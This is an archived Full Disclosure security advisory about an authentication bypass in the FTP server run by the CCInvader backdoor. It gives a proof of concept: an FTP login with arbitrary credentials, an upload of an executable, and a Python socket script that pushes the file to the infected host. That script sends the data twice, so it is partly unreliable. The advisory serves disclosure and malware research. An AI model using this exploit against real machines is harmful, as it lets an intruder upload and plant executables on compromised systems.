---
title: Backdoor.Win32.CCInvader.10 / Authentication Bypass
url: https://seclists.org/fulldisclosure/2024/Sep/45
source: Full Disclosure
date: 2024-09-20
fetch_date: 2025-10-06T18:31:05.140045
---

# Backdoor.Win32.CCInvader.10 / Authentication Bypass

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](44)
[By Date](date.html#45)
[![Next](/images/right-icon-16x16.png)](46)

[![Previous](/images/left-icon-16x16.png)](44)
[By Thread](index.html#45)
[![Next](/images/right-icon-16x16.png)](46)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.CCInvader.10 / Authentication Bypass

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Tue, 17 Sep 2024 21:28:01 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/cb86af8daa35f6977c80814ec6e40d63.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.CCInvader.10
Vulnerability: Authentication Bypass
Description: The malware runs an FTP server.  Third-party adversarys
who can reach infected systems can logon using any username/password
combination. Intruders may then upload executables using ftp PASV,
STOR commands.
Family: CCInvader
Type: PE32
MD5: cb86af8daa35f6977c80814ec6e40d63
SHA256: 8420788f3a575cade5f579bcbf56bb67566bca27c2b9d11dbbafffadef491f31
Vuln ID: MVID-2024-0694
Disclosure: 09/17/2024

Exploit/PoC:
ncat64.exe 192.168.18.125 21
220 ICS FTP Server ready
USER gg
331 Password required for gg
PASS gg
230 User gg logged in.
SYST
215 UNIX Type: L8 Internet Component Suite
250 CWD command successful. "C:/" is current directory.
PWD
257 "C:/" is current directory.
PASV
227 Entering Passive Mode (192,168,18,125,243,249).
STOR DOOM.exe
150 Opening data connection for DOOM.exe.
226 File received ok

from socket import *

MALWARE_HOST="192.168.18.125"
PORT=62457   #243 x 256 + 249
DOOM="DOOM.exe"

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("By Malvuln");

if __name__=="__main__":
    doit()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](44)
[By Date](date.html#45)
[![Next](/images/right-icon-16x16.png)](46)

[![Previous](/images/left-icon-16x16.png)](44)
[By Thread](index.html#45)
[![Next](/images/right-icon-16x16.png)](46)

### Current thread:

* **Backdoor.Win32.CCInvader.10 / Authentication Bypass** *malvuln (Sep 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")